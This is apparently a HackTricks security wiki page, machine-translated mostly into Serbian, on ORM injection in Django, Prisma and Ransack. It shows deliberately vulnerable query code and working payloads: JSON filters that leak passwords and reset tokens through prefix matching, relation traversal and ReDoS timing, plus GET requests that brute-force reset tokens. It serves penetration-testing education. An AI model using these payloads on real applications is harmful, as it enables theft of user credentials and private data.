# ORM Injection

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Django ORM (Python)

U [**ovom postu**](https://www.elttam.com/blog/plormbing-your-django-orm/) obja≈°njeno je kako je moguƒáe uƒçiniti Django ORM ranjivim koristeƒái, na primer, kod kao ≈°to je:

<pre class="language-python"><code class="lang-python">class ArticleView(APIView):
"""
Neki osnovni API prikaz na koji korisnici ≈°alju zahteve za
pretragu ƒçlanaka
"""
def post(self, request: Request, format=None):
try:
<strong>            articles = Article.objects.filter(**request.data)
</strong>            serializer = ArticleSerializer(articles, many=True)
except Exception as e:
return Response([])
return Response(serializer.data)
</code></pre>

Obratite pa≈ænju kako se svi request.data (koji ƒáe biti json) direktno prosleƒëuju da **filtriraju objekte iz baze podataka**. Napadaƒç bi mogao poslati neoƒçekivane filtre kako bi iscurilo vi≈°e podataka nego ≈°to se oƒçekuje.

Primeri:

* **Login:** U jednostavnom prijavljivanju poku≈°ajte da iscurite lozinke korisnika registrovanih unutar njega.
```json
{
"username": "admin",
"password_startswith":"a"
}
```
{% hint style="danger" %}
Moguƒáe je izvr≈°iti brute-force napad na lozinku dok ne doƒëe do curenja.
{% endhint %}

* **Relacijsko filtriranje**: Moguƒáe je preƒái kroz relacije kako bi se do≈°lo do informacija iz kolona za koje se nije ni oƒçekivalo da ƒáe biti kori≈°ƒáene u operaciji. Na primer, ako je moguƒáe doƒái do ƒçlanaka koje je kreirao korisnik sa ovim relacijama: Article(`created_by`) -\[1..1]-> Author (`user`) -\[1..1]-> User(`password`).
```json
{
"created_by__user__password__contains":"pass"
}
```
{% hint style="danger" %}
Moguƒáe je pronaƒái lozinku svih korisnika koji su kreirali ƒçlanak
{% endhint %}

* **Filtriranje vi≈°e prema vi≈°e**: U prethodnom primeru nismo mogli pronaƒái lozinke korisnika koji nisu kreirali ƒçlanak. Meƒëutim, prateƒái druge odnose, to je moguƒáe. Na primer: Article(`created_by`) -\[1..1]-> Author(`departments`) -\[0..\*]-> Department(`employees`) -\[0..\*]-> Author(`user`) -\[1..1]-> User(`password`).
```json
{
"created_by__departments__employees__user_startswith":"admi"
}
```
{% hint style="danger" %}
U ovom sluƒçaju mo≈æemo pronaƒái sve korisnike u odeljenjima korisnika koji su kreirali ƒçlanke i zatim otkriti njihove lozinke (u prethodnom json-u samo otkrivamo korisniƒçka imena, ali je moguƒáe otkriti i lozinke).
{% endhint %}

* **Zloupotreba Django Group i Permission mnogu-na-mnogu odnosa sa korisnicima**: ≈†tavi≈°e, AbstractUser model se koristi za generisanje korisnika u Django-u i po defaultu ovaj model ima neke **mnogu-na-mnogu odnose sa Permission i Group tabelama**. ≈†to je u su≈°tini podrazumevani naƒçin da se **pristupi drugim korisnicima iz jednog korisnika** ako su u **isto—ò grupi ili dele istu dozvolu**.
```bash
# By users in the same group
created_by__user__groups__user__password

# By users with the same permission
created_by__user__user_permissions__user__password
```
* **Obiƒëi filter restrikcije**: Isti blog post je predlo≈æio da se obiƒëu neka filtriranja kao ≈°to je `articles = Article.objects.filter(is_secret=False, **request.data)`. Moguƒáe je izvuƒái ƒçlanke koji imaju is\_secret=True jer mo≈æemo da se vratimo iz veze u tabelu Article i da procurimo tajne ƒçlanke iz ne-tajnih ƒçlanaka jer su rezultati spojeni i is\_secret polje se proverava u ne-tajnom ƒçlanku dok se podaci procuruju iz tajnog ƒçlanka.
```bash
Article.objects.filter(is_secret=False, categories__articles__id=2)
```
{% hint style="danger" %}
Zloupotreba odnosa mo≈æe omoguƒáiti zaobila≈æenje ƒçak i filtera koji su namenjeni za≈°titi prikazanih podataka.
{% endhint %}

* **Gre≈°ka/Na osnovu vremena putem ReDoS**: U prethodnim primerima se oƒçekivalo da ƒáe biti razliƒçitih odgovora ako filtriranje funkcioni≈°e ili ne, kako bi se to koristilo kao orakl. Ali mo≈æe biti moguƒáe da se neka akcija izvr≈°i u bazi podataka i da je odgovor uvek isti. U ovom scenariju mo≈æe biti moguƒáe izazvati gre≈°ku u bazi podataka kako bi se dobio novi orakl.
```json
// Non matching password
{
"created_by__user__password__regex": "^(?=^pbkdf1).*.*.*.*.*.*.*.*!!!!$"
}

// ReDoS matching password (will show some error in the response or check the time)
{"created_by__user__password__regex": "^(?=^pbkdf2).*.*.*.*.*.*.*.*!!!!$"}
```
From te same post regarding this vector:

* **SQLite**: Nema regexp operator po defaultu (zahteva uƒçitavanje treƒáe strane ekstenzije)
* **PostgreSQL**: Nema podrazumevani regex timeout i manje je podlo≈æan backtrackingu
* **MariaDB**: Nema regex timeout

## Prisma ORM (NodeJS)

The following are [**tricks extracted from this post**](https://www.elttam.com/blog/plorming-your-primsa-orm/).

* **Full find control**:

<pre class="language-javascript"><code class="lang-javascript">const app = express();

app.use(express.json());

app.post('/articles/verybad', async (req, res) => {
try {
// Attacker has full control of all prisma options
<strong>        const posts = await prisma.article.findMany(req.body.filter)
</strong>        res.json(posts);
} catch (error) {
res.json([]);
}
});
</code></pre>

It's possible to see that the whole javascript body is passed to prisma to perform queries.

In the example from the original post, this would check all the posts createdBy someone (each post is created by someone) returning also the user info of that someone (username, password...)
```json
{
"filter": {
"include": {
"createdBy": true
}
}
}

// Response
[
{
"id": 1,
"title": "Buy Our Essential Oils",
"body": "They are very healthy to drink",
"published": true,
"createdById": 1,
"createdBy": {
"email": "karen@example.com",
"id": 1,
"isAdmin": false,
"name": "karen",
"password": "super secret passphrase",
"resetToken": "2eed5e80da4b7491"
}
},
...
]
```
–°–ª–µ–¥–µ—õ–∏ —É–ø–∏—Ç –±–∏—Ä–∞ —Å–≤–µ –æ–±—ò–∞–≤–µ –∫–æ—ò–µ —ò–µ –∫—Ä–µ–∏—Ä–∞–æ –Ω–µ–∫–æ —Å–∞ –ª–æ–∑–∏–Ω–∫–æ–º –∏ –≤—Ä–∞—õ–∞ –ª–æ–∑–∏–Ω–∫—É:
```json
{
"filter": {
"select": {
"createdBy": {
"select": {
"password": true
}
}
}
}
}

// Response
[
{
"createdBy": {
"password": "super secret passphrase"
}
},
...
]
```
* **Potpuna kontrola where klauzule**:

Pogledajmo ovo gde napadaƒç mo≈æe kontrolisati `where` klauzulu:

<pre class="language-javascript"><code class="lang-javascript">app.get('/articles', async (req, res) => {
try {
const posts = await prisma.article.findMany({
<strong>            where: req.query.filter as any // Podlo≈æan ORM leak-ovima
</strong>        })
res.json(posts);
} catch (error) {
res.json([]);
}
});
</code></pre>

Moguƒáe je direktno filtrirati lozinku korisnika kao:
```javascript
await prisma.article.findMany({
where: {
createdBy: {
password: {
startsWith: "pas"
}
}
}
})
```
{% hint style="danger" %}
Kori≈°ƒáenjem operacija kao ≈°to je `startsWith` moguƒáe je otkriti informacije.&#x20;
{% endhint %}

* **Zaobila≈æenje filtriranja u mnogim-relacijama:**&#x20;
```javascript
app.post('/articles', async (req, res) => {
try {
const query = req.body.query;
query.published = true;
const posts = await prisma.article.findMany({ where: query })
res.json(posts);
} catch (error) {
res.json([]);
}
});
```
Moguƒáe je otkriti neobjavljene ƒçlanke vraƒáanjem na mnoge-na-mnoge odnose izmeƒëu `Category` -\[\*..\*]-> `Article`:
```json
{
"query": {
"categories": {
"some": {
"articles": {
"some": {
"published": false,
"{articleFieldToLeak}": {
"startsWith": "{testStartsWith}"
}
}
}
}
}
}
}
```
Takoƒëe je moguƒáe leak-ovati sve korisnike zloupotrebom nekih loop back many-to-many odnosa:
```json
{
"query": {
"createdBy": {
"departments": {
"some": {
"employees": {
"some": {
"departments": {
"some": {
"employees": {
"some": {
"departments": {
"some": {
"employees": {
"some": {
"{fieldToLeak}": {
"startsWith": "{testStartsWith}"
}
}
}
}
}
}
}
}
}
}
}
}
}
}
}
}
```
* **Gre≈°ke/Upitnici sa vremenskim odlaganjem**: U originalnom postu mo≈æete proƒçitati veoma opse≈æan skup testova koji su izvedeni kako bi se prona≈°ao optimalni payload za curenje informacija sa payload-om zasnovanim na vremenu. Ovo je:
```json
{
"OR": [
{
"NOT": {ORM_LEAK}
},
{CONTAINS_LIST}
]
}
```
Gde je `{CONTAINS_LIST}` lista sa 1000 stringova kako bi se osiguralo da **odgovor bude odlo≈æen kada se pronaƒëe ispravna leak.**

## **Ransack (Ruby)**

Ove trikove su [**prona≈°li u ovom postu**](https://positive.security/blog/ransack-data-exfiltration)**.**

{% hint style="success" %}
**Napomena da Ransack 4.0.0.0 sada zahteva kori≈°ƒáenje eksplicitne dozvoljene liste za pretra≈æive atribute i asocijacije.**
{% endhint %}

**Vulnerable example:**
```ruby
def index
@q = Post.ransack(params[:q])
@posts = @q.result(distinct: true)
end
```
Napomena kako ƒáe upit biti definisan parametrima koje ≈°alje napadaƒç. Bilo je moguƒáe, na primer, izvr≈°iti brute-force napad na reset token sa:
```http
GET /posts?q[user_reset_password_token_start]=0
GET /posts?q[user_reset_password_token_start]=1
...
```
By brute-forcing and potentially relationships it was possible to leak more data from a database.

## References

* [https://www.elttam.com/blog/plormbing-your-django-orm/](https://www.elttam.com/blog/plormbing-your-django-orm/)
* [https://www.elttam.com/blog/plorming-your-primsa-orm/](https://www.elttam.com/blog/plorming-your-primsa-orm/)
* [https://positive.security/blog/ransack-data-exfiltration](https://positive.security/blog/ransack-data-exfiltration)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
